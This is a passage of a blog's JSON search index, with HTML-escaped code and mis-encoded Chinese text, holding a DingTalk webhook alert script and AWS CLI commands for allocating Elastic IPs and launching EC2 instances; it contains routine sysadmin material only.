class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;atMobiles\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003euser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e],\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;isAtAll\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‹é¢æ”¾shellè„šæœ¬çš„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e ddmsg\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eToken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxxxxxx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eWeburl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    curl -ks -m \u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eWeburl\u003c/span\u003e\u003cspan class=\"si\"\u003e}${\u003c/span\u003e\u003cspan class=\"nv\"\u003eToken\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        -H \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type: application/json;charset=utf-8\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e        -d \u003cspan class=\"s2\"\u003e\u0026#34;{\u0026#39;msgtype\u0026#39;: \u0026#39;text\u0026#39;, \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e             \u0026#39;text\u0026#39;: { \u0026#39;content\u0026#39;: \u0026#39;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$*\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e        }\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u0026gt;/tmp/ddmsg.log\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003egrep \u003cspan class=\"s2\"\u003e\u0026#34;errmsg.*ok\u0026#34;\u003c/span\u003e /tmp/ddmsg.log \u003cspan class=\"p\"\u003e|\u003c/span\u003ewc -l\u003cspan class=\"sb\"\u003e`\u003c/span\u003e -ne \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;send error !\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003ecat /tmp/ddmsg.log\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nb\"\u003eexit\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æµ‹è¯•å†…å®¹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;@è­¦æŠ¥\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eä¸»æœº:\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ehostname\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eä¿¡æ¯:Node test\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eæ—¶é—´:\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +\u003cspan class=\"s2\"\u003e\u0026#34;%F %T\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u0026gt;.msg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat .msg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eddmsg \u003cspan class=\"s2\"\u003e\u0026#34;`cat .msg`\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"é’‰é’‰å‘Šè­¦å‘é€"},{"content":"å®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š\nç”¨shell æˆ–è€…python3 æ§åˆ¶awså»è·å–æ–°IPã€ç»‘å®šIPåˆ°å®ä¾‹ è¿™ä¸ªå°±éå¸¸ç®€å•äº†ï¼Œå› ä¸ºæœ¬èº«awså°±æä¾›pythonçš„å·¥å…·ï¼Œä¸€åˆ‡éƒ½å¯ä»¥apiåŒ–çš„\nåšæ³•å¦‚ä¸‹ï¼š\n#å®‰è£…awsçš„å·¥å…· cd /tmp curl -kL \u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34; -o \u0026#34;awscliv2.zip\u0026#34; unzip awscliv2.zip sudo ./aws/install aws --version #é…ç½®aws key aws configure #æŸ¥çœ‹é…ç½® aws configure list ---------------------------- #ç”³è¯·ä¸€ä¸ªæ–°IPå¹¶ä¸”æ‰“tag aws ec2 allocate-address --region $Region |tee /tmp/eip.log eip_id=$(jq -r \u0026#34;.AllocationId\u0026#34; /tmp/eip.log) aws ec2 create-tags --resources ${eip_id} --tags Key=Name,Value=eip-01 eip=$(jq -r \u0026#34;.PublicIp\u0026#34; /tmp/eip.log) #ç»™ec2èµ‹ipï¼Œå‰ææ˜¯çŸ¥é“ec2_id aws ec2 associate-address --instance-id ${ec2_id} --allocation-id ${eip_id} ---------------------------- #å¯åŠ¨æ–°ec2çš„æ–¹æ³•ï¼š #å¯åŠ¨ec2 aws ec2 run-instances \\ --region $Region --count 1 \\ --instance-type t2.micro \\ --subnet-id ${lan_a_public_id} \\ --security-group-ids $gid \\ --key-name MySshKey \\ --image-id ami-04ff9e9b51c1f62ca \\ |tee /tmp/ec2.log ec2_id=$(jq -r \u0026#34;.Instances[0].InstanceId\u0026#34; /tmp/ec2.log) å‚è€ƒï¼š https://www.cnblogs.com/elvi/p/16542406.html\n","permalink":"https://rendoumi.com/posts/20221123-freelancer_aws/","summary":"\u003cp\u003eå®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç”¨shell æˆ–è€…python3 æ§åˆ¶awså»è·å–æ–°IPã€ç»‘å®šIPåˆ°å®ä¾‹\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªå°±éå¸¸ç®€å•äº†ï¼Œå› ä¸ºæœ¬èº«awså°±æä¾›pythonçš„å·¥å…·ï¼Œä¸€åˆ‡éƒ½å¯ä»¥apiåŒ–çš„\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c#\" data-lang=\"c#\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#å®‰è£…\u003c/span\u003e\u003cspan class=\"n\"\u003eawsçš„å·¥å…·\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecd\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecurl\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ekL\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eo\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;awscliv2.zip\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eunzip\u003c/span\u003e \u003cspan class=\"n\"\u003eawscliv2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ezip\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003esudo\u003c/span\u003e \u003cspan class=\"p\"\u003e./\u003c/span\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003einstall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eversion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#é…ç½®\u003c/span\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003ekey\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003econfigure\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#æŸ¥çœ‹é…ç½®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003econfigure\u003c/span\u003e \u003cspan class=\"n\"\u003elist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e----------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#ç”³è¯·ä¸€ä¸ªæ–°\u003c/span\u003e\u003cspan class=\"n\"\u003eIPå¹¶ä¸”æ‰“tag\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003eallocate\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eaddress\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eregion\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"n\"\u003eRegion\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003etee\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eeip_id\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejq\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;.AllocationId\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003ecreate\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003etags\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eresources\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eeip_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003etags\u003c/span\u003e \u003cspan class=\"n\"\u003eKey\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eValue\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"m\"\u003e01\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejq\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;.PublicIp\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#ç»™\u003c/span\u003e\u003cspan class=\"n\"\u003eec2èµ‹ip\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œå‰ææ˜¯çŸ¥é“\u003c/span\u003e\u003cspan class=\"n\"\u003eec2_id\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003eassociate\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eaddress\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eec2_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eallocation\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eeip_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e----------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#å¯åŠ¨æ–°\u003c/span\u003e\u003cspan class=\"n\"\u003eec2çš„æ–¹æ³•\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼š\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#å¯åŠ¨\u003c/span\u003e\u003cspan class=\"n\"\u003eec2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003einstances\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eregion\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"n\"\u003eRegion\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003etype\u003c/span\u003e \u003cspan class=\"n\"\u003et2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003emicro\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003esubnet\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003elan_a_public_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003esecurity\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eids\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"n\"\u003egid\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"n\"\u003eMySshKey\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"n\"\u003eami\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"m\"\u003e04f\u003c/span\u003e\u003cspan class=\"n\"\u003ef9e9b51c1f62ca\u003c/span\u003e  \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003etee\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eec2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 